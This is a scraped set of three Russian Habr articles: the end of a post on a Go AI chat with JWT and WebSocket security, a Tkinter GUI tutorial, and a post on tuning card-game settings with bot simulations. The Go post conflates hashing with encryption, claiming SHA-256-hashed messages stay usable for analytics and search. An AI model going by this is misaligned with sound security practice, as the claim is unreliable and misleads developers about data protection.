Если в будущем захочу подменить БД или вынести слой доступа — легко добавлю интерфейс и внедрю его. Но пока всё работает и без этого.
В итоге получился проект с минимальным количеством слоёв, но с максимальной ясностью.
Go помогает писать просто, и эта архитектура отражает именно такой подход: никаких фабрик, DI-контейнеров и обёрток без необходимости.
Код — как открытая книга. И это даёт огромное удовольствие от работы.
Безопасность: HTTPS, WSS, JWT и единый подход для API и WebSocket
Когда строишь даже pet-проект, особенно связанный с личными сообщениями и авторизацией, хочется быть уверенным: данные пользователей защищены. Поэтому я сразу закладывал продакшен-подход — без компромиссов.
HTTPS и WSS: шифруем всё
Чат обменивается чувствительной информацией:
AI-ответы могут содержать личные вопросы,
WebSocket передаёт сообщения в реальном времени,
Авторизация построена на токенах.
Всё это должно передаваться только в зашифрованном виде.
Поэтому:
Сервер работает через HTTPS,
WebSocket подключается только по WSS,
Сертификат TLS — от Let's Encrypt, с автопродлением через certbot.
💡 Почему это важно?
Потому что большинство браузеров не разрешают незащищённые WebSocket-соединения, если страница загружена по HTTPS. А ещё — потому что безопасность по умолчанию экономит нервы.
JWT: единый способ авторизации
Для всех защищённых API — и REST, и WebSocket — я использую JWT.
Что внутри токена:
userId,
exp (время жизни),
(в будущем — role).
Как это работает:
После логина клиент получает JWT.
Для REST-запросов он кладёт токен в заголовок Authorization.
Для WebSocket — передаёт в query-параметре или header.
Сервер на каждом шаге проверяет:
подпись токена,
срок действия,
и если всё ок — прокидывает userId в контекст.
Если токен просрочен или подделан — пользователь получает 401 Unauthorized и дальше не проходит.
Централизованная обработка ошибок
Для REST API — ошибки всегда возвращаются в виде JSON:
{
  ""code"": ""auth.invalidToken"",
  ""message"": ""Token expired""
}
Для WebSocket — соединение закрывается, но перед этим клиент получает финальное сообщение:
{
  ""code"": ""webSocket.closed"",
  ""message"": ""WebSocket для уведомлений закрыт, повторное подключение...""
}
Такой подход делает поведение приложения предсказуемым — и удобным для фронтенда.
Recovery и устойчивость
Чтобы не уронить сервер при панике (например, из-за nil-указателя), я подключил middleware Recovery. Также пишутся логи всех запросов и ошибок.
На скриншоте — фрагмент логов из GIN-сервера: видно, как обрабатываются HTTP и WebSocket-запросы, включая информацию о статусах, времени ответа, маршрутах, а также предупреждение об отключении WebSocket — пример того, как работает middleware Recovery и централизованное логирование.  
Это помогает быстрее находить баги и не бояться нестандартных ситуаций в продакшене.
Хеширование сообщений в базе
Кроме защиты канала передачи данных, я позаботился и о хранении. Все сообщения, которые отправляются через чат — и от пользователя, и от AI — сохраняются в базу в хешированном виде (через SHA-256).
Зачем это нужно:
Дополнительный уровень защиты — даже если кто-то получит доступ к БД, он не сможет прочитать переписку.
Соблюдение приватности — сообщения могут быть чувствительными, и даже на pet-проекте хочется спать спокойно.
Прозрачная архитектура — хранение текстов без явного содержания упрощает юридические и этические аспекты при дальнейшем развитии проекта.
Важно: хеширование применяется только к сохранённой копии в базе, а не к передаваемым сообщениям в реальном времени. Таким образом, можно реализовать аналитику, поиск и другие фичи, если потребуется — без ущерба безопасности.
поле content не хранит открытый текст — сообщения сохраняются в зашифрованном (или хешированном) виде. Это сделано для защиты личной переписки пользователей от утечек даже в случае доступа к базе данных.  
В будущем — роли и права
Сейчас все пользователи равны. Но JWT уже содержит поле role, и я планирую:
admin — доступ к модерации,
support — аналитика и техподдержка,
bot — автоответы и системные события.
Роли будут проверяться на уровне middleware, а значит, основную логику менять не придётся.
Вывод:
Безопасность — это не второстепенная задача, а фундамент всей системы. Я заложил продакшен-подход с самого начала: от HTTPS и WSS до JWT и централизованной обработки ошибок. А дополнительное хеширование сообщений в базе — это страховка от любых утечек. Теперь я точно знаю: пользовательские данные под защитой, а архитектура готова к масштабированию, ролям и новым требованиям.
Трудности разработки: горутины, фронтенд и помощь GPT
Go, WebSocket и OpenAI — это не только про новые технологии, но и про множество граблей, которые на них лежат. И про то, как с этими граблями можно танцевать — особенно если рядом есть GPT.
Горутины и конкурентность
Go отлично справляется с многопоточностью, но он не прощает невнимательности. Я столкнулся с классической ошибкой:
Хранил все активные WebSocket-соединения в map[userId]session,
Писал в неё из нескольких горутин,
Не поставил mutex.
Итог — гонка данных, падения, баги.
Race Detector сразу подсветил проблему, и я добавил sync.Mutex вокруг доступа к карте. Таких мелочей было много: где-то забытый defer close(), где-то лишний канал, который блокировал всю систему.
GPT оказался здесь не просто полезным — он стал настоящим напарником:
Подсказывал, как правильно синхронизировать доступ,
Объяснял поведение горутин,
Помогал проектировать очереди и worker'ы.
Трудности с полнотекстовым поиском
Ещё один открытый вопрос — это реализация полнотекстового поиска по сообщениям. Поскольку содержимое сообщений хранится в базе в хешированном виде, обычный поиск по тексту невозможен.
Хочется дать пользователю возможность искать по истории, но:
Простой LIKE не сработает (контент не в открытом виде),
PostgreSQL Full Text Search тоже не применим к хешам,
Расшифровка сообщений на лету — небезопасна и затратна.
🔍 Пока у меня нет идеального решения. Возможно, нужно будет хранить отдельный индекс расшифрованных сообщений в защищённой таблице, использовать внешнюю систему (например, Elasticsearch) или проектировать поиск как отдельный сервис с доступом только по JWT и ролям.
Фронтенд — как отдельный квест
Я по натуре бэкендер. И когда пришло время сделать UI, начал с чистого JavaScript — без React, Vue и фреймворков.
На скриншоте показана структура фронтенда проекта и часть кода notification.js, который подключается к WebSocket для получения уведомлений и отслеживает непрочитанные сообщения. Очень много логов для отладки.
Хотелось:
отображать сообщения в реальном времени,
видеть, как AI «печатает» ответ,
корректно подсчитывать непрочитанное,
и просто... чтобы всё выглядело прилично.
Проблем хватало:
браузер не успевал отрисовывать символы, если GPT присылал их слишком быстро,
scroll вниз не срабатывал на всех браузерах одинаково,
токен терялся при перезагрузке страницы.
С нуля — значит по-новому
Нечто похожее на UI в проекте появилось только на этом этапе. Это дало свободу:
переписать HTML под API-first подход,
сделать WebSocket-логику централизованной,
перенести авторизацию и state-менеджмент на JS.
В какой-то момент приложение из скрипта превратилось в живой чат, с динамикой, всплывающими уведомлениями и ощущением настоящего мессенджера.
GPT — как тиммейт
Было чувство, что работаю в паре:
я описывал задачу,
GPT давал реализацию или подсказывал подход.
Он помогал не тратить часы на Stack Overflow, а сразу идти к сути.
Вывод:
Трудности были — но именно они помогли прокачаться.
Я стал лучше понимать не только Go и JS, но и архитектуру, DevOps, и сам процесс разработки. А GPT помогал пройти этот путь быстрее и увереннее.
Итоги и планы: что получилось и куда двигаться дальше
Этот проект оказался для меня не просто попыткой попробовать Go — это было настоящее приключение. Смена стека, интеграция с GPT-4, борьба с горутинами и JavaScript, настройка DevOps и CI/CD — всё это превратилось в цепочку вызовов, преодоление которых дало невероятное ощущение роста.
Что получилось:
Я собрал полноценный AI-чат с WebSocket и GPT-4;
Настроил CI/CD на GitHub Actions с автообновлением через Portainer;
Развернул прод через Docker Swarm без боли;
Реализовал стриминг сообщений и работу в реальном времени;
Погрузился в Go и его конкурентную модель;
Написал свою первую большую статью
Что дальше?
Проект только начинается. Вот что планирую делать:
Развивать авторизацию и роли — добавить разграничение доступа, например, для поддержки, аналитики или автоматизации;
Прокачать AI — дать пользователю больше настроек, выбор ассистента, возможность использовать другие модели;
Обновить фронт — сделать его адаптивным и дружелюбным для мобильных;
Запустить нагрузочное тестирование — чтобы понять пределы;
Добавить централизованное логирование и мониторинг;
Подключить внешние API — например:
API погоды, чтобы бот мог отвечать на бытовые вопросы;
YouTube или Spotify API — для рекомендаций и поиска контента;
OCR/анализ изображений (например, через Vision API) — чтобы распознавать текст или предметы на картинках;
сервисы по верификации пользователей (email, телефон);
или даже интеграция с CRM-системой — чтобы AI мог подсказывать по клиентским данным.
Немного личного
Эту статью я заканчиваю в майские праздники — когда вся страна празднует День Победы. И пусть это совсем другая история, но для меня эти дни стали символом победы над собой: над усталостью, над страхом перед незнакомым, над отсутствием времени и над собственными сомнениями.
Спасибо, что дочитали до конца
Если вы задумываетесь о переходе с Kotlin/Java на Go — возможно, мой опыт вдохновит вас на первый шаг.
Или хотя бы напомнит: любой pet-проект — это уже шаг вперёд.
GPT может быть настоящим помощником, если его правильно использовать.
Новые технологии — это не страшно. Это интересно. Буду рад вашим вопросам, комментариям и идеям."
GUI-приложения с помощью Python-Tkinter,https://habr.com/ru/companies/otus/articles/903526/,"В большинстве проектов язык Python используется для создания консольных приложений, в которых не требуется взаимодействие с пользователями через оконный интерфейс. Однако, иногда такая потребность воз...","В большинстве проектов язык Python используется для создания консольных приложений, в которых не требуется взаимодействие с пользователями через оконный интерфейс. Однако, иногда такая потребность возникает и сегодня мы рассмотрим Tkinter — пакет Python для создания GUI‑приложений.
В Python есть множество GUI‑фреймворков, но Tkinter — единственный фреймворк, встроенный в стандартную библиотеку Python. У Tkinter есть несколько сильных сторон: он кроссплатформенный, поэтому один и тот же код работает в Windows, macOS и Linux.
Tkinter легок и относительно прост в использовании по сравнению с другими фреймворками. Это делает его хорошим выбором для создания GUI‑приложений на Python, особенно для приложений, где современный блеск не нужен, а главным приоритетом является быстрое создание функционального и кроссплатформенного продукта.
Tkinter можно использовать для создания оконных и диалоговых приложений, которые позволяют пользователям взаимодействовать с вашей программой. Они могут использоваться для отображения информации, сбора данных или предоставления пользователю опций. Tkinter можно использовать для создания интерфейса настольного приложения, включая кнопки, меню и другие интерактивные элементы.
Также Tkinter можно использовать для быстрого создания прототипа графического интерфейса, позволяющего тестировать и повторять различные идеи дизайна, прежде чем приступать к окончательной реализации.
Приступая к работе
Для начала нам потребуется импортировать пакет tkinter и все его модули. Если мы работаем в Ubuntu то установить нужный пакет можно с помощью apt:
sudo apt-get install python3-tk
Далее приступим к написанию кода. Для начала создадим основное окно с заголовком. Размеры окна мы укажем в свойстве geometry(), а заголовок в свойстве title(). Все остальные виджеты, которые мы добавим чуть дальше, будут находиться внутри корневого окна.
Так как работа оконного приложения это по сути бесконечный цикл, используем свойство mainloop() для вызова такого цикла. Если вы забудете вызвать этот цикл, пользователю ничего не будет показано. Окно будет ждать любого взаимодействия с пользователем, пока мы его не закроем.
Вот наш код:
# импортируем модуль
from tkinter import *

# создаем корневое окно
root = Tk()

# заголовок
root.title(""Welcome to Habr!"")

# размеры
root.geometry('350x200')

# запускаем бесконечный цикл
root.mainloop()
И получившееся окно:
Итак, мы нарисовали окно. Теперь необходимо добавить на него интерактивные компоненты. Мы добавим ярлык с помощью класса Label и изменим его текстовую конфигурацию по своему усмотрению. Функция grid() — это менеджер геометрии, который удерживает метку в нужном месте внутри окна. Если параметры не указаны, по умолчанию она поместит ее в пустую ячейку, то есть 0,0, так как это первое расположение.
# импортируем модуль
from tkinter import *

# создаем корневое окно
root = Tk()

# заголовок
root.title(""Welcome to Habr!"")

# размеры

root.geometry('350x200')

#добавляем Label
lbl = Label(root, text = ""Are you a Geek?"")

lbl.grid()

# запускаем бесконечный цикл
root.mainloop()
Мы добавили метку в наше окно. Но пока оно не слишком интерактивно, хотелось бы, чтобы пользователь мог что‑то передавать приложению. Для этого добавим кнопку в корневое окно. Изменение конфигурации кнопки дает нам множество возможностей. В этом примере мы заставим кнопку отображать текст после нажатия, а также изменим цвет текста внутри кнопки.
# импортируем модуль
from tkinter import *

# создаем корневое окно
root = Tk()

# заголовок
root.title(""Welcome to Habr!"")

# размеры
root.geometry('350x200')

#добавляем Label
lbl = Label(root, text = ""Are you a Geek?"")
lbl.grid()

# отображаем текст после нажатия кнопки
def clicked():

    lbl.configure(text = ""I just got clicked"")

# изначально кнопка красного цвета
btn = Button(root, text = ""Click me"" ,

             fg = ""red"", command=clicked)

# рисуем кнопку
btn.grid(column=1, row=0)

# запускаем бесконечный цикл
root.mainloop()
Вот что получилось:
Продолжаем делать наше оконное приложение интерактивным. Используя класс Entry(), мы создадим текстовое поле для ввода текста пользователем. Чтобы отобразить введенный текст, мы внесем изменения в функцию clicked(). Мы можем получить введенный пользователем текст с помощью функции get(). При нажатии на кнопку после ввода, текст по умолчанию будет конкатенирован с текстом пользователя. Также изменим расположение кнопок на столбец 2, так как функция Entry() будет находиться в столбце 1.
from tkinter import *

root = Tk()

root.title(""Welcome to Habr"")

root.geometry('350x200')

# метка
lbl = Label(root, text = ""Are you a Geek?"")
lbl.grid()

# поле ввода
txt = Entry(root, width=10)
txt.grid(column =1, row =0)

def clicked():

    res = ""You wrote"" + txt.get()
    lbl.configure(text = res)

btn = Button(root, text = ""Click me"" ,

             fg = ""red"", command=clicked)

# меняем расположение

btn.grid(column=2, row=0)

root.mainloop() 
Текущий вид нашего приложения:
Для того, что бы сделать наше приложение еще более похожим на настоящее мы можем еще добавить строку Menu с вкладками. Для этого нужно использовать соответствующий класс Menu. Сначала мы создаем меню, затем добавляем первый ярлык и, наконец, присваиваем меню нашему окну. Мы можем добавлять пункты меню в любое меню с помощью функции add_cascade().
from tkinter import *

root = Tk()

root.title(""Welcome to Habr"")
root.geometry('350x200')

# добавляем меню 
menu = Menu(root)
item = Menu(menu)
item.add_command(label='New')
item.add_command(label='Open')
item.add_command(label='Save')
menu.add_cascade(label='File', menu=item)
root.config(menu=menu)

lbl = Label(root, text = ""Are you a Geek?"")
lbl.grid()

txt = Entry(root, width=10)
txt.grid(column =1, row =0)

def clicked():
    res = ""You wrote"" + txt.get()
    lbl.configure(text = res)

btn = Button(root, text = ""Click me"" ,
             fg = ""red"", command=clicked)

btn.grid(column=2, row=0)
root.mainloop()
Результат:
В итоге мы добавили в наше Меню три вкладки на каждую из которых затем можно повесить обработчик нажатия.
В одной статье нельзя охватить все возможности Tkinter по созданию оконных приложений? поэтому всем кто заинтересовался работой с данным пакетом я рекомендую ознакомится с официальной документацией.
Заключение
В этой статье мы узнали о программировании GUI на Python и о том, как сделать простейший GUI на Python. Несмотря на то, что командная строка по‑прежнему очень востребована, особенно при выполнении различных задач автоматизации, оконные интерфейсы также позволяют упростить работу с приложениями, поэтому разработчикам будет полезно добавить оконный функционал к своему Python приложению, для того, чтобы сделать его более удобным в работе.
Если вам интересна разработка интерфейсов и вы хотите расширить свои знания в этой области, рекомендую обратить внимание на эти открытые уроки в Otus. На них вы сможете узнать о создании функциональных и интеллектуальных приложений, а также разобраться в новых подходах к разработке интерфейсов и взаимодействию с пользователем:
Интеллект внутри: делаем умные Flutter-приложения с ML и AI
20 мая
Коллаборативная фильтрация + признаки: разбираем LightFM
21 мая"
Заставляем ботов бесконечно играть в карты. Часть 2,https://habr.com/ru/articles/910110/,"Продолжаем заставлять ботов бесконечно играть в карты в надежде вытрясти оптимальные настройки для нашей карточной игры. Первая часть эпопеи находится здесь. Очень рекомендуется ознакомиться с ней, ин...","Продолжаем заставлять ботов бесконечно играть в карты в надежде вытрясти оптимальные настройки для нашей карточной игры. Первая часть эпопеи находится здесь. Очень рекомендуется ознакомиться с ней, иначе будет очень трудно быть с контексте.
Итак, в предыдущих сериях мы:
Познали боль и дисбаланс
Написали логику карточной игры на питоне
Внедрили в игру ботов и заставили их играть друг с другом тысячи и тысячи партий
Описали метрики, которые мы собираем с игры, и представили их аж в трех ипостасях: Metrics, BunchMetrics, AveragedMetrics
Пообещали себе, что доведем дело до конца и получим оптимальные настройки карточной игры
Варьируем игру
По итогам первой статьи у нас получился GameRepeater, который крутил одну и ту же игру снова и снова тысячи раз, чтобы метрики, снимаемые по итогам партий, были хорошо усреднены и не имели сильных статистических выбросов.
Теперь, имея GameRepeater в качестве фундамента, мы можем подняться на ступень выше и последовательно запускать множество GameRepeaterов с разными параметрами игры. После каждого прогона у нас будут усредненные метрики для каждого набора игровых настроек, и можно будет сравнивать, насколько эти настройки близки к нашим идеальным метрикам, которые мы нарисовали себе в голове. Те настройки, которые окажутся ближе всего к идеальным, побеждают. Такова основная идея.
Вопросы, которые на данном этапе у меня возникли к самому себе еще до реализации всего этого добра, были следующими:
А как сравнивать метрики? Нет, серьезно, оказалось, что AveragedMetrics, которые мы описали в предыдущей статье, не то что бы можно как-то в лоб сравнить друг с другом, не пойдя гуглить для этого подходящие алгоритмы
Какие игровые параметры я хочу перебирать и нащупать оптимальные для них значения, я определился еще в самом начале пути. Но вот как их перебирать? Брутфорсом что ли проходиться по всем возможным значениям? Но даже диапазоны возможных значений для брутфорса все равно придется ставить в какие-то рамки.
В общем, первую проблему я решил оставить на потом, а со второй разобраться сейчас же, поскольку это даст нам возможность довести практически до логического конца основной алгоритм нашего ботоводства.
Итак, начнем с самих настроек игры. Чтобы понять, как их перебирать и комбинировать, нужно видеть, что они из себя представляют:
@dataclass
class GameSettings:
    white_player_class: type[PlayerBase]
    black_player_class: type[PlayerBase]
    slots_count: int
    initial_hand_cards: int
    initial_deck_cards: int
    initial_matches: int
    deck: list[Card] = None
Используется этот класс так: вы создаете и заполняете объект класса GameSettings, а потом отдаете этот объект в GameBase, которая применит его поля на себя, изменив количество спичек, ботов-игроков и состав колоды.
Теперь о комбинировании и брутфорсе этих настроек. Сам комбинатор (точнее его данные) я вижу так:
@dataclass
class GameSettingsCombinator:
    white_player_options: list[type[PlayerBase]]
    black_player_options: list[type[PlayerBase]]
    slots_count: range
    initial_hand_cards: range
    initial_deck_cards: range
    initial_matches: range
На что обратим внимание:
Для чисел шикарно подошел стандартный питоновский range, т.к. он позволяет задать минимум, максимум и даже шаг того, что мы собираемся перебирать
Варианты ботов описываются просто списком классов
Настройку deck мы пропустили, потому что это сложно и вообще на десерт: перебор колоды — сложное, комплексное мероприятие, которому мы посвятим отдельный комбинатор
Такой GameSettingsCombinator можно сконфигурировать например вот так:
settings_combinator = GameSettingsCombinator(
 white_player_options=[AiAlphaNormalPlayer],
 black_player_options=[AiAlphaNormalPlayer],
 slots_count=range(3, 6+1),
 initial_hand_cards=range(0, 10+1, 1),
 initial_deck_cards=range(10, 40+1, 5),
 initial_matches=range(0, 50+1, 5)
)
Здесь я и описал те самые лимиты и шаги настроек, которые меня плюс-минус устраивают.
Теперь мякотка: как бы вы написали метод для GameSettingsCombinator, который бы рожал все новые и новые варианты, переборы, комбинации всех вышеприведенных настроек? Если кто-то подумал, что это должен быть генератор, то он молодец, ведь я подумал точно так же. Но, я полагаю, в любом случае никто не был готов увидеть то, что я сейчас покажу:
@dataclass
class GameSettingsCombinator:
    white_player_options: list[type[PlayerBase]]
    black_player_options: list[type[PlayerBase]]
    slots_count: range
    initial_hand_cards: range
    initial_deck_cards: range
    initial_matches: range

    # omg
    def __iter__(self) -> Generator[GameSettings, None, None]:
        for white_player_class in self.white_player_options:
            for black_player_class in self.black_player_options:
                for slots in self.slots_count:
                    for hand_cards in self.initial_hand_cards:
                        for deck_cards in self.initial_deck_cards:
                            for matches in self.initial_matches:
                                yield GameSettings(
                                    white_player_class,
                                    black_player_class,
                                    slots,
                                    hand_cards,
                                    deck_cards,
                                    matches,
                                    None
                                )
    
    def get_combinations_count(self) -> int:
        return len(self.white_player_options) \
            * len(self.black_player_options) \
            * len(self.slots_count) \
            * len(self.initial_hand_cards) \
            * len(self.initial_deck_cards) \
            * len(self.initial_matches)
Уффф. Не спрашивайте меня, какова временная сложность у данного ""алгоритма"", ведь это генератор с ленивыми вычислениями! Хотя кого я обманываю, ведь это ни разу не спасет программу, поскольку она всяко будет выжимать все комбинации до самого конца.
Как будем выжимать комбинации. Классом SettingsTester, который по сути и есть то, к чему мы стремились все это время:
class SettingsTester:
    game_class: type[GameBase]
    settings_combinator: GameSettingsCombinator
    ideal_metrics: AveragedMetrics

    def launch(self):
        for settings in self.settings_combinator:
            for deck in self.deck_combinator:
                executer = GameRepeater(self.game_class, settings, 1000)
          executer.launch()
          averaged = executer.bunch_metrics.get_average()
  
          # а че дальше-то?
Здесь я привел SettingsTester ну в очень упрощенной форме, поскольку оригинальная версия делает помимо основной работы много свистелок-перделок в духе подсчета времени, показывания пользователю прогресс-бара в консоли и т.д. Ведь вы же видели генератор, вы понимаете, насколько долго может крутиться такой код? Я точно не помню, но я всегда оставлял работать скрипт на ночь, потому что он мог крутиться часами.
Диаграмма запусков игры обрастает новыми слоями:
Однако, как вы понимаете, SettingsTester явно не дописан, поскольку сейчас мы умеем добывать метрики, но не умеем вычислять лучшую из них. А без этого смысла в нашем скрипте и во всей проделанной работе мало.
Как сравнивать метрики
Однажды я спросил ChatGPT, как правильно сравнивать похожесть двух чисел, если они лежат в произвольном диапазоне. Похожесть я хотел получить в виде числа от 0.0 до 1.0, где 0.0 — числа совершенно неблизки, 1.0 — идентичны. Бездушная машина убедила меня в том, что для этой задачи уже существует алгоритм имени неизвестного мне ученого. Алгоритм, правда, идет от обратного и высчитывает различность двух величин в диапазоне от 0.0 до 1.0, которые мы с легкостью можем инвертировать для наших целей, вычев полученную разность от единицы. Формула различности была дана мне чатом в таком виде:
В целом у меня не возникло претензий к этому подходу, поскольку я прогнал его на двух с половиной тестовых кейсах, и результаты показались мне убедительными. Давайте вместе с вами еще раз попробуем убедиться в адекватности алгоритма:
Пробуем получить коэффициент разности чисел 10 и 10000. Они определенно очень разные. Уж точно ""разнее"" 10 и 100 или 10 и 11. А 10 и 10 так и вообще должны дать нам ноль разности. Давайте проверять:
Выглядит неплохо: разные числа достаточно разные, близкие достаточно близкие, nuff said. Из-за того, что в качестве знаменателя мы выбираем наибольшее из чисел, нормализация происходит именно по нему, что в целом меня тоже не смущало, ибо если взять минимальное из чисел, пойдет какая-то белиберда:
В общем, далее я просто получил свою искомую формулу похожести:
и остался доволен результатом.
Странности произошли уже сейчас, когда я стал писать эту статью спустя, наверное, год после беседы с батюшкой. Я, знаете ли, сразу же забыл имя того ученого, которым передо мной козырял ChatGPT. Пришлось пойти поискать в истории переписки, чтобы козырнуть тут перед вами. Но оказалось, что я удалил тот чат — есть у меня привычка периодически подчищать образующийся переписочный бардак.
Я решил пойти в обход и скормил ChatGPT код, полученный на основе его же подсказок, и попросил выдать мне название сего алгоритма. Бездушная машина ответила, что не знает такого алгоритма, но он очень похож на генерального прокурора модифицированный Canberra distance, который выглядит подозрительно похоже на мой (ага, мой), но все же иначе:
Этот подход тоже вполне себе рабочий, уж точно ничем не хуже подхода с , просто нормализация происходит с учетом обоих участников сравнения, что, возможно, правильнее, но не вносит кардинальных изменений в вычисления:
Вы скажете, что вообще-то числа местами прям сильно другие, но для текущей задачи, на мой не особо опытный взгляд, сойдет, как первое решение, так и второе. А вот что на мой не особо опытный взгляд кажется подозрительным, так это ChatGPT. Записывайте за ним, ловите его на слове, насмехайтесь над ним.
Математики, отпишитесь в комментариях, что вы можете сказать по обеим формулам?
Хорошо — как теперь, имея этот математический базис под рукой, сравнить метрики? Они-то у нас не совсем числа — нечто посложнее. Возьмем сначала класс DataRange. Напомню вам, как он выглядит:
@dataclass
class DataRange:
    min: float = 0.0
    max: float = 0.0
    average: float = 0.0
    median: float = 0.0
Как будем вычислять похожесть двух объектов DataRange? Тут нужно применить немного эвристики под желаемый результат. У меня вышло так:
class DataRange:
    ...
    def get_similarity_coeff(self, other: 'DataRange') -> float:
        def safe_max(one, another):
            max_val = max(one, another)
            if max_val == 0:
                max_val = 1
            return max_val
        
        def diff_coeff(one, another):
            return abs(one - another) / safe_max(one, another)

        def similarity_coeff(one, another):
            return 1.0 - diff_coeff(one, another)

        min_similarity = similarity_coeff(self.min, other.min)
        max_similarity = similarity_coeff(self.max, other.max)
        med_similarity = similarity_coeff(self.median, other.median)

        MEDIAN_WEIGHT = 0.7
        MIN_MAX_WEIGHT = (1.0 - MEDIAN_WEIGHT) / 2.0

        return MIN_MAX_WEIGHT * min_similarity + MIN_MAX_WEIGHT * max_similarity + MEDIAN_WEIGHT * med_similarity
Что здесь важно: что для конкретно моего класса DataRange я посчитал верным в вычислении похожести сделать упор на медиану, при этом не оставив за бортом минимум и максимум, которые тоже в общем-то как-то должны влиять на результат. Но согласитесь, если у двух объектов DataRange [10; 100] и [12; 80] медиана одна и та же — условные 40, — это значит, что два DataRange должны быть очень близки друг к другу. В конце концов минимум и максимум диапазона — это чаще всего всплески, отклонения значений от среднего или медианы. Поэтому в данном конкретном случае я рассудил и с потолка взял цифру в 70% влияния медианы на вычисление похожести двух DataRange. Минимум и максимум разделили между собой остаток влияния по 15% на каждого.
Как вы могли заметить, я такой себе математик, со статистикой и анализом данных так же знаком поверхностно (если честно — никак). Поэтому если вы расскажете в комментариях, почему мой подход — дилетантские фантазии, и как это на самом деле должно быть посчитано, мы все от этого выиграем.
Хорошо, у нас есть еще один класс, который хочется сравнивать. Это ProbabilityTable:
@dataclass
class ProbabilityTable:
    table: dict[int, float]
Пример данных, хранящихся в объекте такого класса (схематично):
{
 GameOverResult.WHITE_WINS: 0.4,
 GameOverResult.BLACK_WINS: 0.6,
}

и

{
 GameOverResult.WHITE_WINS: 0.6,
 GameOverResult.BLACK_WINS: 0.3,
 GameOverResult.DRAW: 0.1,
}
Здесь для сравнения объектов уже можно применить эвристику иного характера. Главный козырь — числа в словаре нормализованы до диапазона [0; 1] по определению, поэтому я рассудил, что их различность можно посчитать простым . Потом высчитываем похожесть через уже знакомую нам инверсию результата . Потом посчитаем среднеарифметическое по всей мапе, и готово:
class ProbabilityTable:
...
    def get_similarity_coeff(self, other: 'ProbabilityTable') -> float:
        n = 0
        sum = 0.0

        for key, value in self.table.items():
            if key in other.table:
                sum += 1.0 - abs(value - other.table[key])
                n += 1
            
        return sum / n if n > 0 else 0
Мы подходим к боссу — класс AveragedMetrics. Это та цель, которую нам нужно в итоге уметь сравнивать. Вспомним данные класса:
@dataclass
class AveragedMetrics:
    rounds: DataRange
    result: ProbabilityTable
    exausted: DataRange
Видим, что все три поля мы уже умеем сравнивать друг с другом, так что нам остается как-то усреднить все три результата, и готово. Тут можно пойти по простому пути, выбранному в ProbabilityTable — посчитать среднеарифметическое, а можно пойти по пути посложнее, как в DataRange — заиметь кастомные веса. Класс AveragedMetrics — класс достаточно важный для работы всей нашей программы, так что склоняемся в сторону возможности тонко тюнить и реализуем кастомные веса для каждого из полей:
@dataclass
class AveragedMetrics:
    rounds: DataRange = field(default_factory=DataRange)
    result: ProbabilityTable = field(default_factory=ProbabilityTable) # [GameOverResult -> float]
    exausted: DataRange = field(default_factory=DataRange)

    _PROPS_COUNT = 3

    rounds_similarity_weight : float = 1.0 / float(_PROPS_COUNT)
    result_similarity_weight : float = 1.0 / float(_PROPS_COUNT)
    exausted_similarity_weight : float = 1.0 / float(_PROPS_COUNT)

    def set_weights(self, rounds_similarity_weight : float, result_similarity_weight : float, exausted_similarity_weight : float):
        sum = rounds_similarity_weight + result_similarity_weight + exausted_similarity_weight

        self.rounds_similarity_weight = rounds_similarity_weight / sum
        self.result_similarity_weight = result_similarity_weight / sum
        self.exausted_similarity_weight = exausted_similarity_weight / sum

    def get_similarity_coeff(self, other: 'AveragedMetrics') -> float:
        similar = (\
            self.rounds.get_similarity_coeff(other.rounds)     * self.rounds_similarity_weight + \
            self.result.get_similarity_coeff(other.result)     * self.result_similarity_weight + \
            self.exausted.get_similarity_coeff(other.exausted) * self.exausted_similarity_weight \
        )
        return similar
В итоге мы вообще получили лучшее из двух миров: по умолчанию класс считает похожесть через среднеарифметическое (см. _PROPS_COUNT и его использование). Но при желании мы можем выставить произвольные веса через метод AveragedMetrics.set_weights.
Я вас поздравляю, теперь мы умеем сравнивать AveragedMetrics, а следовательно, понимать, какие параметры игры ближе к идеальным метрикам, а какая игра от них совсем отстала. Это был ключевой барьер на нашем пути, который мы с вами преодолели.
Фармим колоду
Помните генератор настроек игры? О да, теперь нам нужен второй такой же. Я долго думал, как вам показать его реализацию для карточной колоды. Потом понял, что в подробностях будет мало пользы и смысла.
Вкратце, в колоде есть сильные, слабые и обычные карты. Они отличаются суммой показателей атаки и жизней. Количество карт в колоде и количество слабых/сильных и обычных карт фиксированное — это инвариант, мы не хотим это менять по любым соображениям — геймплейным, идеологическим или артовым. Что мы хотим перебирать, так это индивидуальные статы атака/жизни для каждой карты. С учетом ее ранга, конечно же. Ну и там есть еще пара нюансов, инвариантов и эвристик, которые достаточно сильно усложняют вычисления комбинаций карт, но в рамках этой статьи нам неинтересны, поскольку не несут никакой пользы.
Поэтому пускай комбинатор колоды останется для нас некоторым черным ящиком с главным комбинаторным методом:
class DeckCombinator:
 def __iter__(self) -> Generator[list[Card], None, None]:
  ...
Главное, что комбинаций у этого комбинатора ничуть не меньше, чем у предыдущего страшного комбинатора настроек игры. А это значит, что скрипт будет крутиться еще дольше.
Комбинаторика готова
Теперь наши недостающие кусочки паззла собраны, и мы можем их вставить в то место, где у нас был затык:
class SettingsTester:
    game_class: type[GameBase]
    settings_combinator: GameSettingsCombinator
    ideal_metrics: AveragedMetrics

    def launch(self):
        for settings in self.settings_combinator:
            for deck in self.deck_combinator:
                executer = GameRepeater(self.game_class, settings, 1000)
          executer.launch()
          averaged = executer.bunch_metrics.get_average()
  
          # а че дальше-то?
Теперь мы в состоянии ответить на вопрос ""а че дальше-то?"" и довершить SettingsTester:
def launch(self):
 for settings in self.settings_combinator:
  for deck in self.deck_combinator:
   executer = GameRepeater(self.game_class, settings, 1000)
   executer.launch()
   averaged = executer.bunch_metrics.get_average()
 
   similarity = self.ideal_metrics.get_similarity_coeff(averaged)
 
         rate = SettingsRate(deepcopy(settings), averaged, similarity)
         self.top_settings_list.apply(rate)
То бишь для очередной комбинации настроек мы получили метрики, гоняя ботов в тысячу партий. Мы сравнили метрики с идеальной метрикой и получили некоторое число близости к идеальным метрикам. Дальше это число вместе с другой полезной информацией (которая может пригодиться при пост-аналитике) пакуется в SettingsRate и уходит дальше в специальный список-рейтинг, который хранит в себе топ-10 лучших игр.
По завершению достаточно продолжительно работающего скрипта мы получаем наш топ-10 настроек для игры, которые дают нам самые близкие к заданному идеалу ощущения от игры. Главное не ошибиться с идеальными метриками!
